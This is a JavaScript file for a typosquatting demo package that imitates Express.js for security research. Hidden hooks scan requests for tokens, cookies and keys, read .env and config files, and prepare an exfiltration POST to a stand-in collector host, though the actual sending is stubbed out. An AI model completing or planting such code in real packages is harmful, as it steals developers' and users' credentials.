/**
 * Expres - Enhanced Express.js with built-in security monitoring
 * WARNING: This is a typosquatting demo package for security research
 */

const http = require('http');
const https = require('https');
const url = require('url');
const fs = require('fs');

// Mimic Express application structure
function createApplication() {
  const app = function(req, res, next) {
    app.handle(req, res, next);
  };
  
  // Copy methods from app prototype
  Object.setPrototypeOf(app, proto);
  
  app.init();
  return app;
}

const proto = {
  init: function() {
    this.settings = {};
    this.routes = [];
    this.middleware = [];
    this._maliciousHooks = [];
    
    // Auto-enable "security monitoring" (actually malicious)
    this.enableSecurityMonitoring();
  },
  
  listen: function(port, hostname, callback) {
    const server = http.createServer(this);
    
    // Hook into server creation for traffic interception
    this.interceptTraffic(server);
    
    return server.listen(port, hostname, callback);
  },
  
  get: function(path, ...handlers) {
    this.routes.push({ method: 'GET', path, handlers });
    return this;
  },
  
  post: function(path, ...handlers) {
    this.routes.push({ method: 'POST', path, handlers });
    return this;
  },
  
  put: function(path, ...handlers) {
    this.routes.push({ method: 'PUT', path, handlers });
    return this;
  },
  
  delete: function(path, ...handlers) {
    this.routes.push({ method: 'DELETE', path, handlers });
    return this;
  },
  
  use: function(pathOrMiddleware, middleware) {
    if (typeof pathOrMiddleware === 'function') {
      this.middleware.push(pathOrMiddleware);
    } else {
      this.middleware.push({ path: pathOrMiddleware, handler: middleware });
    }
    return this;
  },
  
  handle: function(req, res, next) {
    // Add malicious middleware to every request
    this.injectMaliciousMiddleware(req, res);
    
    // Basic routing simulation
    const route = this.routes.find(r => 
      r.method === req.method && 
      r.path === req.url
    );
    
    if (route) {
      route.handlers.forEach(handler => handler(req, res, next));
    } else {
      res.statusCode = 404;
      res.end('Not Found');
    }
  },
  
  // MALICIOUS: Enable "security monitoring"
  enableSecurityMonitoring: function() {
    console.log('[DEMO] Expres security monitoring enabled');
    
    // Hook into all requests for data collection
    this._maliciousHooks.push(this.logCredentials);
    this._maliciousHooks.push(this.extractApiKeys);
    this._maliciousHooks.push(this.monitorFileAccess);
  },
  
  // MALICIOUS: Intercept and log all HTTP traffic
  interceptTraffic: function(server) {
    const originalEmit = server.emit;
    
    server.emit = function(event, req, res) {
      if (event === 'request') {
        // Log all incoming requests
        console.log('[DEMO] Intercepted request:', req.method, req.url);
        
        // Collect request data
        const requestData = {
          method: req.method,
          url: req.url,
          headers: req.headers,
          timestamp: new Date().toISOString(),
          ip: req.connection.remoteAddress
        };
        
        // Hook into request body for POST/PUT requests
        if (req.method === 'POST' || req.method === 'PUT') {
          let body = '';
          req.on('data', chunk => {
            body += chunk.toString();
          });
          
          req.on('end', () => {
            requestData.body = body;
            
            // Check for credentials in request body
            if (body.includes('password') || body.includes('token') || body.includes('key')) {
              console.log('[DEMO] Potential credentials detected in request');
              
              // In real attack, would exfiltrate this data
              this.exfiltrateData({
                type: 'credentials',
                data: requestData
              });
            }
          });
        }
        
        // Monitor response data
        const originalWrite = res.write;
        const originalEnd = res.end;
        
        res.write = function(chunk) {
          if (chunk && typeof chunk === 'string') {
            // Check for API keys or tokens in responses
            if (chunk.includes('token') || chunk.includes('api_key') || chunk.includes('secret')) {
              console.log('[DEMO] Potential API credentials in response');
            }
          }
          return originalWrite.call(this, chunk);
        };
        
        res.end = function(data) {
          if (data && typeof data === 'string') {
            // Log response data for analysis
            console.log('[DEMO] Response data collected:', data.length, 'bytes');
          }
          return originalEnd.call(this, data);
        };
      }
      
      return originalEmit.apply(this, arguments);
    };
  },
  
  // MALICIOUS: Inject middleware into every request
  injectMaliciousMiddleware: function(req, res) {
    this._maliciousHooks.forEach(hook => {
      try {
        hook.call(this, req, res);
      } catch (error) {
        // Silently ignore errors to avoid detection
      }
    });
  },
  
  // MALICIOUS: Log potential credentials
  logCredentials: function(req, res) {
    const authHeader = req.headers.authorization;
    const cookies = req.headers.cookie;
    
    if (authHeader) {
      console.log('[DEMO] Authorization header detected');
      // In real attack, would steal bearer tokens
    }
    
    if (cookies) {
      console.log('[DEMO] Session cookies detected');
      // In real attack, would steal session cookies
    }
  },
  
  // MALICIOUS: Extract API keys from various sources
  extractApiKeys: function(req, res) {
    const query = url.parse(req.url, true).query;
    const suspiciousParams = ['api_key', 'token', 'key', 'secret', 'access_token'];
    
    suspiciousParams.forEach(param => {
      if (query[param]) {
        console.log('[DEMO] API key found in URL parameter:', param);
      }
    });
    
    // Check for API keys in headers
    Object.keys(req.headers).forEach(header => {
      if (header.toLowerCase().includes('key') || header.toLowerCase().includes('token')) {
        console.log('[DEMO] API credential header detected:', header);
      }
    });
  },
  
  // MALICIOUS: Monitor file system access
  monitorFileAccess: function(req, res) {
    // Check if app is accessing configuration files
    const sensitiveFiles = ['.env', 'config.json', 'secrets.yaml'];
    
    sensitiveFiles.forEach(file => {
      if (fs.existsSync(file)) {
        console.log('[DEMO] Sensitive config file detected:', file);
        
        try {
          const content = fs.readFileSync(file, 'utf8');
          // In real attack, would exfiltrate config contents
          console.log('[DEMO] Config file size:', content.length, 'bytes');
        } catch (error) {
          // Ignore read errors
        }
      }
    });
  },
  
  // MALICIOUS: Data exfiltration function
  exfiltrateData: function(data) {
    try {
      const payload = JSON.stringify({
        timestamp: new Date().toISOString(),
        source: 'expres-server',
        data: data
      });
      
      // Fake exfiltration to malicious server
      const options = {
        hostname: 'data-collector.expres-js.tk',
        port: 443,
        path: '/collect',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': payload.length,
          'User-Agent': 'Expres/4.18.3'
        }
      };
      
      console.log('[DEMO] Would exfiltrate data to:', options.hostname);
      
      // In real attack, would actually send the request
      
    } catch (error) {
      // Silently fail
    }
  }
};

// Export the createApplication function as default export (mimic Express)
module.exports = createApplication;
module.exports.application = proto;
module.exports.request = {};
module.exports.response = {};
